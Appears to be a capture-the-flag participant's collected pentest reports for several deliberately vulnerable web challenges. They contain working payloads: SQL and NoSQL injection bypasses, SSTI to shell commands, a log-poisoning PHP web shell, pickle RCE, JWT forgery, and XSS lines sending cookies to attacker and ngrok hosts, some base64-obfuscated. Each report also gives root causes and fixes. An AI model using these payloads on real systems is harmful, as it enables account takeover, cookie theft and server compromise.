# LSEG-01 web_potent_quotes

We think our agency's login panel application might be vulnerable. Agent, could you assess the security of the website, and help us prevent malicious actors from gaining access to our confidential information? Submit the penetration test report by sending it to the following LSEG email within one week of completing the event. Saj.Malik@lseg.com


SQL Injection in Login Endpoint Allows Authentication Bypass and Flag Disclosure

---

## Summary

The `/login` endpoint is vulnerable to SQL Injection due to unsanitized user input being passed directly into a database query. This allows an unauthenticated attacker to bypass authentication, log in as the `admin` user, and retrieve sensitive server-side data (`/app/flag`).

---

## Affected Endpoint(s)

`POST /login`

---

## Vulnerability Type

- SQL Injection (Authentication Bypass)

---

## Severity

**Critical**

---

## Steps to Reproduce

1. Navigate to the login endpoint.
    
2. Send the following HTTP request:
    

```bash

POST /login Content-Type: application/json  
{ "username": "admin' --",   "password": "test" }

```

3. Observe the response.
    
---

## Expected Result

The application should reject invalid credentials and deny access.

---

## Actual Result

The application authenticates the attacker as the `admin` user and returns the contents of the `/app/flag` file.

---

## Proof of Concept

The SQL Injection payload (`admin' --`) bypasses password validation by commenting out the remainder of the SQL query.  
When the database returns `admin`, the application executes privileged logic:


```bash

if (user == 'admin') {     return res.send(response(fs.readFileSync('/app/flag').toString())) }

```


This results in unauthorized disclosure of sensitive data.

---

## Impact

An attacker can:

- Bypass authentication without valid credentials
    
- Gain administrative access
    
- Read sensitive server-side files
    
- Fully compromise the application's access control
    

This represents a complete authentication and authorization failure.

---

## Root Cause

User-controlled input is passed directly into database queries without sanitization or parameterized statements, allowing SQL Injection.

---

## Remediation Recommendations

- Use parameterized queries / prepared statements
    
- Validate and sanitize all user input
    
- Do not rely on database return values alone for authorization
    
- Implement role-based access control
    
- Store passwords using secure hashing algorithms (bcrypt/argon2)



# LSEG-03 web_solid_recruit

You've been tasked with a pentesting engagement on a recruitment portal system, they've provided you with a mockup build of the website and they've asked you to find a way to hijack sensitive information. Submit the penetration test report by sending it to the following LSEG email within one week of completing the event. Saj.Malik@lseg.com

Stored Cross-Site Scripting (XSS) in Recruitment Form Allows Admin Cookie Theft

---

## Summary

A **stored Cross-Site Scripting (XSS)** vulnerability exists in the recruitment form’s **Biography** field.  
User-supplied HTML/JavaScript is stored without sanitization and later rendered in an admin review panel. When an admin views the submitted form, the injected JavaScript executes in the admin’s browser, allowing **cookie exfiltration**.

---

## Affected Feature

`Recruitment Form → Biography field`

---

## Vulnerability Type

- Stored Cross-Site Scripting (XSS)

---
## Severity

**High**

---

## Steps to Reproduce

1. Navigate to the recruitment form.
    
2. Fill out the form with arbitrary data.
    
3. In the **Biography** field, submit the following payload:
    

```bash
<img src=x onerror="fetch('https://<attacker-ngrok>.ngrok-free.app?c='+btoa(document.cookie))">
```

4. Submit the form.
    
5. Start a listener on the attacker-controlled server:

```
nc -lvnp 9001
```

6. Wait for the admin bot to review the submission.

---

## Expected Result

User input should be sanitized or encoded, and no JavaScript should execute when viewed by the admin bot.

---

## Actual Result

When the admin bot views the submission:

- The injected JavaScript executes

- The admin bot’s cookies are sent to the attacker-controlled server


---

## Proof of Concept

### Injected Payload

```
<img src=x onerror="fetch('https://<attacker-ngrok>.ngrok-free.app?c='+btoa(document.cookie))">
```

### Observed Network Request (Admin Browser)

```
GET /?c=ZmXhZZIIVEJ7YRQKcjFiDQZc1RfbTMObnRfdDBfYjNFM3NjNHA= 
Host: <attacker-ngrok>.ngrok-free.app User-Agent: HeadlessChrome/100.0.4899.0
```

This confirms execution of attacker-controlled JavaScript in the admin bot’s browser context.

---

## Impact

An attacker can:

- Execute arbitrary JavaScript in the admin’s browser
    
- Steal admin session cookies
    
- Hijack admin sessions
    
- Perform privileged actions on behalf of the admin
    
- Fully compromise administrative functionality
    

---

## Root Cause

- User input is stored without sanitization
    
- HTML content is rendered directly in the admin panel
    
- No output encoding or Content Security Policy (CSP) is enforced
    

---

## Remediation Recommendations

- Sanitize user input on submission

- Encode output before rendering user-supplied content

- Disallow HTML tags in free-text fields

- Implement a strict Content Security Policy (CSP)

- Mark session cookies as `HttpOnly` and `Secure`


# LSEG-05 - web community

Your friend owns a well-known travel agency and asked you for assistance in reviewing their upcoming website to find any potential vulnerabilities. Could you check the application and see if you can gain access to the application host? Submit the penetration test report by sending it to the following LSEG email within one week of completing the event. Saj.Malik@lseg.com


![[Pasted image 20260131104901.png]]


HTB{n0sQl_0r_t3mpl4t3s_1nj3c7i0n_15_1n3v174bl3!_edbedd3f05986ea65760956d98=
445a60

HTB{n0sQl_0r_t3mpl4t3s_1nj3c7i0n_15_1n3v174bl3}


<HTB{n0sQl_0r_t3mpl4t3s_1nj3c7i0n_15_1n3v174bl3!_edbedd3f05986ea65760956d98=
445a60}></HTB{n0sQl_0r_t3mpl4t3s_1nj3c7i0n_15_1n3v174bl3!=
_edbedd3f05986ea65760956d98445a60}>

HTB{n0sQl_0r_t3mpl4t3s_1nj3c7i0n_15_1n3v174bl3!=
_edbedd3f05986ea65760956d98445a60}

![[Pasted image 20260131120313.png]]


![[Pasted image 20260131120256.png]]

NoSQL Injection Leads to Admin Takeover, SSTI, and Command Injection Resulting in Full System Compromise

## Summary

A critical vulnerability chain was identified in the application.  
A **NoSQL Injection** in the login endpoint allows authentication bypass and admin account takeover.  
As an admin, the attacker can inject malicious template expressions leading to **Server-Side Template Injection (SSTI)**, which further results in **arbitrary OS command execution (Command Injection)** and sensitive file disclosure.

---

## Vulnerability Type

- NoSQL Injection (Authentication Bypass)
    
- Server-Side Template Injection (SSTI)
    
- Command Injection
    
- Privilege Escalation
    
- Sensitive Data Disclosure
    

---
## Severity

**Critical**

---
## Affected Components

```
POST /login Admin Panel → Email Settings → Subscription Template
```

---
## Step-by-Step Reproduction

---

### 1️ NoSQL Injection – Authentication Bypass

Send the following request:

```bash
POST /login Content-Type: application/json  
{   "username": { "$ne": null },   "password": { "$ne": null } }
```

#### Result

- Authentication bypassed
    
- Attacker logged in as **admin**
    

---

### 2️ Access Admin Panel

After login:

- Navigate to **Admin Dashboard**
    
- Open **Email Settings**
    
- Locate **Subscription Template**
    

---

### 3️ Server-Side Template Injection (SSTI)

Insert the following payload into the template editor:

```bash

#{global.process.mainModule.require('child_process').execSync('id')}

```

Save the template.

---

### 4️ Command Injection via SSTI

Modify the payload to execute OS commands and read sensitive files:

```
#{global.process.mainModule.require('child_process').execSync('base64 -i /root/flag')}
```

Trigger template rendering using **Preview** or email generation.

---

## Expected Result

- Authentication should fail for invalid credentials
    
- Templates should not evaluate user input
    
- OS command execution should not be possible
    

---

## Actual Result

- Authentication bypassed
    
- Admin privileges obtained
    
- Server-side template expressions executed
    
- Arbitrary OS commands executed
    
- Sensitive file contents returned in the response
    

---

## Proof of Concept

### Payload Used (Command Injection)

```
#{global.process.mainModule.require('child_process').execSync('base64 -i /root/flag')}
```

### Observed Behavior

- The server executes shell commands via Node.js `child_process`
    
- Output of `/root/flag` is base64-encoded and returned
    
- Confirms **remote command execution**
    

---

## Impact

An attacker can:

- Bypass authentication
    
- Take over admin accounts
    
- Execute arbitrary system commands
    
- Read/write sensitive files
    
- Fully compromise the application and host system
    

This represents a **complete compromise of confidentiality, integrity, and availability**.

---

## Root Cause Analysis

### NoSQL Injection

- CouchDB operators allowed in user input
    
- No schema or type validation
    
- Query operator injection (`$ne`)
    

### SSTI

- User-controlled template content evaluated server-side
    
- Access to `global`, `process`, and `require`
    

### Command Injection

- `child_process.execSync()` exposed via template context
    
- No sandboxing or execution restrictions
    

---

## Remediation Recommendations

### Authentication

- Enforce strict input schemas (string-only)
    
- Block CouchDB operators
    
- Use parameterized queries
    

### Template Engine

- Never evaluate user input as templates
    
- Escape template expressions
    
- Use logic-less templates
    
- Remove access to Node.js globals
    

### System Security

- Disable `child_process` access
    
- Run application as non-root user
    
- Restrict filesystem permissions



# LSEG-06: web_maddog_memorial

You have been tasked with the pentesting engagement on the memorial website of the great Buford "Mad Dog" Tannen, who was a true patriotic countryman and the pride of Hill Valley! The Tannen family has asked you to find out any loopholes in the system and see if the admin account can be compromised. They don't want any teenager or a mad scientist to break in and discover the secrets they are hiding! Submit the penetration test report by sending it to the following LSEG email within one week of completing the event. Saj.Malik@lseg.com


![[Pasted image 20260131133358.png]]


![[Pasted image 20260131133419.png]]

![[Pasted image 20260131133451.png]]

SQL Injection Allows Disclosure of JWT Signing Secret and Forging of Admin Tokens

---

## Summary

A **SQL Injection vulnerability** allows an attacker to extract sensitive data from the backend database, including the **JWT signing secret**. Using the leaked secret, an attacker can forge a valid **admin JWT token**, resulting in full authentication bypass and administrative access.

---

## Vulnerability Type

- SQL Injection
    
- Sensitive Information Disclosure
    
- Authentication Bypass
    
- JWT Forgery
    

---

## Severity

**Critical**

---

## Affected Component(s)

`Vulnerable API Endpoint (SQL Injection) JWT-based Authentication Mechanism`

---

## Step-by-Step Reproduction

---

### 1️ SQL Injection – Database Dump

Using SQL Injection, the attacker enumerates database tables and extracts sensitive values.

**Extracted Database Details:**

`Database: tannen_memorial Table: keystore Columns: - kid (int) - secret (varchar)`

**Dumped Data:**


| kid | secret         |
| --- | -------------- |
| 1   | NVPHemWRETuDHj |
| 2   | MWhsFe95eX2q4g |

This confirms successful extraction of **JWT signing secrets**.

---

### 2️ JWT Forgery Using Leaked Secret

Using the extracted secret (`MWhsFe95eX2q4g`), the attacker forges a valid JWT.

**JWT Header:**

`{   "alg": "HS256",   "typ": "JWT",   "kid": 2 }`

**JWT Payload:**

`{   "username": "admin",   "iat": 1709843411 }`

**Signing Algorithm:**

`HS256`

The token is signed using the leaked secret.

---

### 3️ Authentication Bypass

The forged JWT is sent in authenticated requests:

`Authorization: Bearer <forged_admin_jwt>`

---

## Expected Result

- SQL Injection should not be possible
    
- JWT signing secrets should never be stored or retrievable from the database
    
- Forged tokens should be rejected
    

---

## Actual Result

- SQL Injection allows database dumping
    
- JWT signing secret is disclosed
    
- Attacker successfully forges a valid admin JWT
    
- Application accepts forged token and grants admin access
    

---

## Proof of Concept

- SQL Injection used to dump `keystore.secret`
    
- JWT generated using leaked secret
    
- Forged token accepted by the application
    
- Admin-only functionality accessible
    

This confirms **complete authentication compromise**.

---

## Impact

An attacker can:

- Extract JWT signing secrets
    
- Forge arbitrary JWT tokens
    
- Impersonate any user, including admin
    
- Fully bypass authentication and authorization controls
    
- Take complete control of the application
    

This results in **total compromise of application security**.

---

## Root Cause Analysis

### SQL Injection

- User input passed directly into SQL queries
    
- No parameterized queries or input sanitization
    

### JWT Misconfiguration

- JWT secrets stored in plaintext in the database
    
- Secrets accessible via application queries
    
- No key rotation or isolation
    

---

## Remediation Recommendations

### SQL Injection Mitigation

- Use parameterized queries / prepared statements
    
- Apply strict input validation
    
- Employ ORM protections
    

### JWT Security

- Store JWT secrets securely (environment variables / secret managers)
    
- Never expose signing keys via application-accessible databases
    
- Rotate JWT secrets regularly
    
- Validate `kid` values strictly
    
- Consider asymmetric JWT (RS256)


SCENARIO NAME

# LSEG-07: web_broken_prod

Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server. Submit the penetration test report by sending it to the following LSEG email within one week of completing the event. Saj.Malik@lseg.com

![[Pasted image 20260131181346.png]]

![[Pasted image 20260131181328.png]]


## Title

Session Forgery Leads to Admin Takeover, LFI, and Remote Code Execution via Log Poisoning

---

## Summary

Multiple critical vulnerabilities exist in the application that can be chained to achieve **unauthenticated admin access**, **arbitrary file read**, and **remote code execution**.

An attacker can:

1. Forge a valid admin session due to insecure client-side session handling
    
2. Abuse Local File Inclusion (LFI) to read arbitrary files
    
3. Achieve Remote Code Execution (RCE) by poisoning server logs and including them via LFI
    

This results in **full compromise of the application and host**.

---

## Severity

**Critical**

---

## Vulnerability Type

- Authentication Bypass (Session Forgery)
    
- Local File Inclusion (LFI)
    
- Remote Code Execution (Log Poisoning)
    
- Privilege Escalation
    

---

## Affected Components

`challenge/SessionHandler.php challenge/views/admin.php nginx access logs`

---

## Step-by-Step Reproduction

---

### 1️ Session Forgery – Authentication Bypass

#### Vulnerable Code

`setcookie('PHPSESSID', base64_encode(json_encode([     'username' => $username ])), time()+1333337, '/');`

The session cookie is:

- Client-controlled
    
- Only base64-encoded
    
- Not signed or verified
    
- Not stored server-side
    

#### Exploitation

Create a forged admin session cookie:

`{"username":"admin"}`

Base64:

`eyJ1c2VybmFtZSI6ImFkbWluIn0=`

Set cookie:

`PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0=`

#### Result

- Attacker is instantly authenticated as **admin**
    

---

### 2️ Local File Inclusion (LFI)

#### Vulnerable Code

`$utilFile = str_replace("../","", $_GET['util']); $fullPath = '/www/utils/'.$utilFile; include_once($fullPath);`

The filter is bypassable using traversal sequences.

#### Exploitation

`/?util=....//....//....//etc/passwd`

Resolves to:

`/etc/passwd`

#### Result

- Arbitrary file read
    
- Source code disclosure
    
- Sensitive file exposure (flags, configs)
    

---

### 3️ Remote Code Execution – Log Poisoning + LFI

#### Step 1: Poison nginx Access Log

`curl -H "User-Agent: <?php system($_GET['cmd']); ?>" http://target/`

This writes PHP code into:

`/var/log/nginx/access.log`

---

#### Step 2: Include Log via LFI

`/?util=....//....//....//var/log/nginx/access.log&cmd=id`

#### Result

- PHP code inside the log is executed
    
- Arbitrary OS command execution confirmed
    

Example:

`whoami id cat /flag_*.txt`

---

## Expected Result

- Session data should be server-side and cryptographically protected
    
- File inclusion should be restricted to a strict whitelist
    
- User input should never lead to code execution
    

---

## Actual Result

- Attacker forges admin session
    
- Arbitrary files are readable
    
- OS commands execute on the server
    
- Full system compromise achieved
    

---

## Impact

An attacker can:

- Bypass authentication
    
- Gain admin access without credentials
    
- Read arbitrary files
    
- Execute arbitrary commands
    
- Fully compromise the application and underlying host
    

This represents a **complete loss of confidentiality, integrity, and availability**.

---

## Root Cause Analysis

### Session Handling

- Client-side session storage
    
- No integrity protection
    
- No server-side verification
    

### File Inclusion

- Weak traversal filtering
    
- No canonicalization
    
- No whitelist
    

### Code Execution

- Logs stored in executable context
    
- LFI allows inclusion of poisoned logs
    

---

## Remediation Recommendations

### Immediate

- Use PHP server-side sessions (`$_SESSION`)
    
- Sign session data with HMAC
    
- Implement strict allowlist for included files
    
- Disable PHP execution in log directories
    

### Short Term

- Add authentication checks in admin views
    
- Hash passwords using bcrypt/argon2
    
- Apply least-privilege file permissions
    

### Long Term

- Migrate to a modern framework
    
- Implement CSP and security headers
    
- Perform regular security testing

# LSEG-10: web_scrapeware

Hill Valley has filed a complaint that someone hijacked their forums website, can you take a look and identify the culprit? Submit the penetration test report by sending it to the following LSEG email within one week of completing the event. Saj.Malik@lseg.com


## Title

**Critical: Stored XSS + Insecure Deserialization + Plaintext Passwords Lead to Full Admin and Server Compromise**

---

## Summary

Multiple critical vulnerabilities exist in the Scrapeware application that can be chained together to achieve **admin account takeover and remote code execution**.

An attacker can:

1. Inject persistent JavaScript via Stored XSS

2. Execute code in an automated admin browser session

3. Steal admin credentials and sessions

4. Exploit insecure deserialization to achieve **server-side RCE**

This results in **complete application and system compromise**.

---

## Vulnerability Class

- Stored Cross-Site Scripting (XSS)

- Insecure Deserialization (Pickle)

- Plaintext Password Storage

- Missing CSRF Protection

- IDOR

- Weak Session Management


---

## Severity

**Critical**

---

## Step-by-Step Exploitation (Attack Chain)

### Step 1: Stored XSS in Quote Requests (Initial Access)

**Endpoint:**

`POST /api/request-quote`

**Vulnerable Code:**

`<p class="card-text">Request Message : {{ request.quote_message | safe }}</p>`

The `| safe` filter disables HTML escaping, allowing arbitrary JavaScript execution.

**Proof of Concept:**

`{   "quote_message": "<img src=x onerror=\"fetch('https://attacker.com?c='+document.cookie)\">" }`

---

### Step 2: Automated Admin Bot Executes Payload

The application uses a Selenium bot that automatically logs in as admin and visits:

`/admin/quote-requests`

This causes the attacker’s JavaScript to execute **inside the admin session**, resulting in:

- Session hijacking

- Authenticated admin actions

- API access as admin


---

### Step 3: Plaintext Password Exposure

**Vulnerable Code:**

`password = db.Column(db.String(100))  # Plain text`

Passwords are stored and compared in plaintext:

`user.password == password`

If the database is accessed (via admin compromise), all credentials are immediately exposed.

---

### Step 4: Insecure Deserialization → Remote Code Execution

**Vulnerable Code:**

`pickle.loads(base64.b64decode(data))`

Pickle deserialization allows arbitrary code execution if attacker-controlled data reaches Redis.

**RCE Payload Example:**

`class RCE:     def __reduce__(self):         return (os.system, ("id > /tmp/pwned",))`

This results in **full server-side command execution**.

---

## Impact

An attacker can:

- Execute arbitrary JavaScript as admin
    
- Steal admin sessions and credentials
    
- Read and manipulate application data
    
- Execute OS commands on the server
    
- Fully compromise backend infrastructure
    

This is a **complete security failure**.

---

## Root Cause

- Unsafe template rendering (`| safe`)
    
- Automated privileged bot browsing user content
    
- Insecure deserialization using Pickle
    
- Plaintext password storage
    
- Missing CSRF protection
    
- Missing authorization checks (IDOR)
    

---

## Recommended Remediation


1. Remove `| safe` from all templates

2. Replace Pickle with JSON serialization

3. Hash passwords using bcrypt / Argon2

4. Disable admin bot or sandbox it



# LSEG-02: WEB_TRUNCATED_REQUEST

You are in an internal pentesting engagement, and you come across this employee purchase requests portal. Can you hijack the admin account? Submit the penetration test report by sending it to the following LSEG email within one week of completing the event. Saj.Malik@lseg.com

![[Pasted image 20260131204439.png]]


![[Pasted image 20260131204454.png]]


![[Pasted image 20260131204504.png]]

**Critical: JWT Authentication Bypass via Hardcoded Weak HS256 Signing Secret**

---

## Summary

The application uses JSON Web Tokens (JWT) for authentication with the HS256 algorithm and a **hardcoded, extremely weak signing secret (`"a"`)**.  
An attacker can trivially forge valid JWTs, impersonate any user (including admin), and gain full unauthorized access to protected resources.

This results in **complete authentication bypass and privilege escalation**.

---

## Vulnerability Type

- Broken Authentication
    
- Cryptographic Weakness
    
- Improper Access Control
    
- CWE-798: Use of Hard-coded Credentials
    
- CWE-347: Improper Verification of Cryptographic Signature
    

---

## Severity

**Critical**

---

## Affected Component

JWT authentication / authorization logic  
File observed:

`helpers/JWTHelper.js`

---

## Technical Details

The application signs and verifies JWTs using the HS256 algorithm with a hardcoded secret:

```

const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const SECRET = 'a'//;crypto.randomBytes(69).toString('hex');

module.exports = {
    async sign(data) {
        return jwt.sign(data, SECRET, {
            algorithm: 'HS256'
        });
    },
    async verify(token) {
        return jwt.verify(token, SECRET, {
            algorithm: 'HS256'
        });

    }

};


```

Because HS256 is a symmetric algorithm, **any party that knows the secret can generate valid tokens**.  
Since the secret is a single character (`"a"`), it can be trivially guessed or brute-forced instantly.

---

## Steps to Reproduce

1. Create a custom JWT payload with elevated privileges, for example:
    

`{   "username": "admin",   "iat": 1700000000 }`

2. Sign the token using HS256 with secret key `a`.  
    This can be done using tools such as **CyberChef**, **jwt.io**, or programmatically.
    
3. Send the forged token to the application:
    
    - As an `Authorization` header:
        
        `Authorization: Bearer <forged_jwt>`
        
    - Or as a session cookie, if applicable.
        
4. Access a protected endpoint.
    

---

## Expected Result

The application should reject forged or tampered JWTs and deny unauthorized access.

---

## Actual Result

The application accepts the forged JWT as valid and grants access as the impersonated user (including admin).

---

## Impact

An attacker can:

- Bypass authentication completely
    
- Impersonate any user
    
- Gain administrative privileges
    
- Access or modify sensitive data
    
- Fully compromise application integrity
    

This vulnerability leads to **total account takeover** and should be treated as **Critical**.

---

## Proof of Concept

A forged JWT signed with secret `"a"` successfully passes verification and grants admin access.

Example forged token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2Vy.......c2OTN9.qbEFtrNyhPfVj6dnCUwr27hEjGdTp0kMaTEqpCNhlXk"

Signed using HS256 and secret `a`

---

## Recommended Remediation

1. **Remove hardcoded secrets**
    
2. Use a **strong, randomly generated secret** (minimum 256-bit entropy)
    
3. Store secrets securely using environment variables or a secrets manager
    
4. Prefer **asymmetric JWT algorithms (RS256)** where:
    
    - Private key signs tokens
        
    - Public key verifies tokens
        
5. Do not trust JWT claims blindly — validate authorization server-side
    

---



# LSEG-04: Web_catchthem_all

Your one-stop resource to find which city you can find your favorite pokemon to catch on! Go catch 'em all! Note: The remote instance might take a few minutes to spawn. Please be patient. Submit the penetration test report by sending it to the following LSEG email within one week of completing the event. Saj.Malik@lseg.com




![[Pasted image 20260131210220.png]]

**Critical: Remote Command Execution via Debug Endpoint Command Injection**

---

## Summary

The application exposes a `/debug` endpoint that executes operating system commands using `execSync()` with user-controlled input.  
Due to **improper authentication logic and lack of command sanitization**, an attacker can execute arbitrary system commands on the server, leading to **full server compromise**.

This results in **Remote Command Execution (RCE)**.

---

## Vulnerability Type

- Command Injection

- Remote Code Execution (RCE)

- Improper Authentication



---

## Severity

**Critical**

---

## Affected Endpoint

`GET /debug`

---

## Technical Details

The `/debug` endpoint executes system commands supplied via the `cmd` query parameter:

`const { execSync } = require('child_process');  const cmdExec = execSync(cmd);`

### Authentication Bypass

The endpoint attempts to protect access using a secret check:

`if (! secret === process.env.DEBUG_SECRET )     return res.status(500).send('Unauthorized');`

This logic is **incorrect** due to operator precedence.  
`!secret` is evaluated first, and the comparison never correctly validates the secret.

As a result:

- The authorization check is effectively bypassed

- Any requester who passes the localhost check can reach command execution


---

## Proof of Concept

Request:

`GET /debug?cmd=cat+/root/flag&secret=hi`

Response:

`{   "cmd": "cat /root/flag",   "output": "HTB{...}" }`

This confirms that arbitrary system commands are executed and their output is returned to the attacker.

---

## Impact

An attacker can:

- Execute arbitrary OS commands

- Read sensitive files (e.g. `/etc/passwd`, secrets, flags)

- Achieve full server compromise

- Potentially pivot to other internal systems


This is a **complete security break**.

---
## Recommended Remediation

1. **Remove the `/debug` endpoint from production**

2. Never execute raw system commands from user input

3. Fix authentication logic:

   `if (secret !== process.env.DEBUG_SECRET)`

4. Use strict allow-lists if command execution is absolutely required

5. Log debug actions but never expose them over HTTP


---


# LSEG-09: Web_Valley_forums


**Critical: Prototype Pollution Leading to Stored XSS and Admin Session Compromise**

---

## Summary

The Web Valley Forums application is vulnerable to a **Prototype Pollution** flaw that can be abused to **bypass the XSS filtering mechanism**, resulting in **Stored Cross-Site Scripting (XSS)**.

This vulnerability can be reliably chained with an **automated admin reporting bot** to execute arbitrary JavaScript in an **admin-authenticated browser context**, allowing an attacker to steal sensitive cookies and fully compromise the admin account.

The issue is **unauthenticated, remotely exploitable**, and results in **complete loss of confidentiality and integrity**.

---

## Severity

**Critical**

---

## Vulnerability Type

- Prototype Pollution
    
- Stored Cross-Site Scripting (XSS)
    
- Privilege Escalation via Admin Bot
    
- Missing CSRF Protection
    

---

## Affected Components

- URL query parameter parsing
    
- XSS filtering logic
    
- Comment rendering in templates
    
- `/api/report` endpoint
    
- Admin bot 


---

## Root Cause

User-controlled query parameters are recursively parsed without key sanitization, allowing modification of JavaScript object prototypes (`__proto__`). This enables attackers to modify the XSS filter’s whitelist and inject malicious HTML/JavaScript that is later rendered to privileged users.

---

## Technical Details

### 1. Prototype Pollution via URL Parameters (CRITICAL)

**Impact:** XSS Filter Bypass

The application processes URL parameters without blocking dangerous keys such as `__proto__`, `constructor`, or `prototype`.

**Example payload:**

`__proto__.whiteList.img=src,onerror`

This pollutes the prototype chain and alters the XSS filter configuration, allowing normally blocked attributes such as `onerror`.

---

### 2. Stored XSS in Post Comments (CRITICAL)

User-supplied search queries are rendered in templates without effective sanitization once the filter is bypassed.

**Rendered template:**

`  <a href="#" onclick="report(this, '{{post.id}}')" class="mb-4 ms-1"><small>Report this post</small></a>`

When combined with prototype pollution, this allows execution of arbitrary JavaScript.

**XSS Payload:**

`<img src=x onerror="fetch('https://attacker.com/?cookie='+document.cookie)">`

---

### 3. Admin Bot Privilege Abuse (HIGH)

The `/api/report` endpoint triggers an automated admin bot that visits user-controlled content.

**Key issue:**

- Bot sets sensitive cookies before visiting the page
    
- No URL validation
    
- No CSRF protection
    

**Relevant behavior:**

``await page.setCookie(...cookies); await page.goto(`/posts/${id}`);``

Any XSS payload executes with **admin cookies present**.

---

### 4. Missing CSRF Protection (HIGH)

The `/api/report` endpoint accepts POST requests without CSRF validation, allowing attackers to force the admin bot to visit malicious URLs.

---

## Proof of Concept

### Step 1: Craft Malicious Payload

`<img src=x onerror="fetch('https://ngrok/?flag='+document.cookie)">`

### Step 2: Trigger Admin Bot

``curl -X POST http://target/api/report \   -H "Content-Type: application/json" \   -d '{"id":"1?__proto__.whiteList.img=src,onerror&search=<img src=x onerror=fetch(`https://ngrok/?c=`+document.cookie)>"}'``

### Step 3: Result

- Admin bot visits the post
    
- JavaScript executes in admin context
    
- Sensitive cookie successfully exfiltrated
    

---

## Impact

An attacker can:

- Execute JavaScript as admin
    
- Steal admin cookies and sessions
    
- Perform privileged actions
    
- Modify or delete forum content
    
- Potentially escalate to further backend compromise
    

**Business impact includes account takeover, data breach, and platform defacement.**

---

## Attack Chain Summary

1. Prototype pollution via URL parameters
    
2. XSS filter bypass
    
3. Stored XSS injection
    
4. Trigger admin bot via `/api/report`
    
5. JavaScript executes with admin cookies
    
6. Sensitive data exfiltrated
    

---

## Recommendations

### Immediate

- Block prototype pollution keys (`__proto__`, `constructor`, `prototype`)
    
- Enforce strict output encoding
    
- Remove unsafe HTML rendering paths





```
fetch('https://f18ca0606a7f.ngrok-free.app/' + btoa(document.cookie))

<img src=x onerror='fetch("https://f18ca0606a7f.ngrok-free.app/?C="+document.cookie)'></img>

src="data:;base64,ZmV0Y2goImh0dHBzOi8vZjE4Y2EwNjA2YTdmLm5ncm9rLWZyZWUuYXBwLz9DPSIrZG9jdW1lbnQuY29va2llKQ=="

<img src="data:;base64,ZmV0Y2goImh0dHBzOi8vZjE4Y2EwNjA2YTdmLm5ncm9rLWZyZWUuYXBwLz9DPSIrZG9jdW1lbnQuY29va2llKQ=="></img>

```
